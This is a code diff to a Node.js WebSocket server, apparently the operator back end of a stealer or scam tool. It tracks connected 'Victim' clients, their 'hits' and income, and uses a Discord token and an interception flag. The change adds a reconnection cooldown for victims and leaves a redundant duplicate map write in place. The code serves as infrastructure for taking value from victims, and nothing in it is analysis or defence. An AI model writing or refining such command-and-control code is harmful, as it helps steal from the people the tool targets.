@@ -21,6 +21,7 @@ const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const SEUIL_MASTER = 500000000; // 100,000,000 (100M)
 let INTERCEPT = false;
+const COOLDOWN_TIME = 5 * 60 * 1000;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
@@ -558,15 +559,36 @@ wss.on('connection', (ws, req) => {
     }
   
     if (usertype === "Victim") {
-        if (activeVictims.has(username)) {
-            log(`Victim ${username} déjà présent, remplacement...`);
-            activeVictims.get(username).ws.terminate(); // Note le .ws ici
-        }
+        const now = Date.now();
+        const existingVictim = activeVictims.get(username);
         
+        if (existingVictim) {
+            const timeSinceLastHit = now - existingVictim.lastSeen;
+        
+            if (timeSinceLastHit < COOLDOWN_TIME) {
+                const minutesLeft = Math.ceil((COOLDOWN_TIME - timeSinceLastHit) / 60000);
+                log(`🚫 Connexion refusée pour ${username} : Trop récent (Reste ${minutesLeft} min)`);
+                
+                // On ferme la connexion immédiatement sans traiter le hit
+                ws.terminate(); 
+                return; 
+            }
+        
+            // Si le cooldown est passé, on nettoie l'ancienne connexion avant d'accepter la nouvelle
+            log(`Victim ${username} déjà présent mais cooldown expiré, remplacement...`);
+            if (existingVictim.ws) existingVictim.ws.terminate();
+        }
+                
         activeVictims.set(username, {
             ws: ws,
             maxIncome: 0,
-            connectedAt: Date.now() // On stocke le timestamp actuel
+            
+        });
+        activeVictims.set(username, {
+            ws: ws,
+            lastSeen: now, // On enregistre l'heure actuelle
+            maxIncome: 0,
+            connectedAt: Date.now() 
         });
         
         log(`🤖 Victim connecté : ${username}`);
